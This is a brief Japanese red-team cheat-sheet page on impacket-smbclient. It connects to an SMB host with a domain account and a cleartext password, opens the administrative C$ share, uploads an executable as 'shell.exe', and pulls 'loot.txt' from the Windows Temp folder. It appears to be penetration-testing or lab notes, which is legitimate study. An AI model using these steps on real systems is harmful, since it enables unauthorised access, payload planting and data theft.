---
title: impacket-smbclient
parent: Tools
grand_parent: Red Team
---

# 接続
```zsh
impacket-smbclient 'zeus/o.foller:EarlyMorningFootball777@192.168.159.160'
```

接続後：
```cmd
# 共有一覧の表示
shares
#使用する共有を選択
use C$
# ディレクトリの確認
ls
```
# アップロード（put）
```zsh
put localfile.exe shell.exe
```

# ダウンロード（get）
```cmd
get C:\Windows\Temp\loot.txt
```
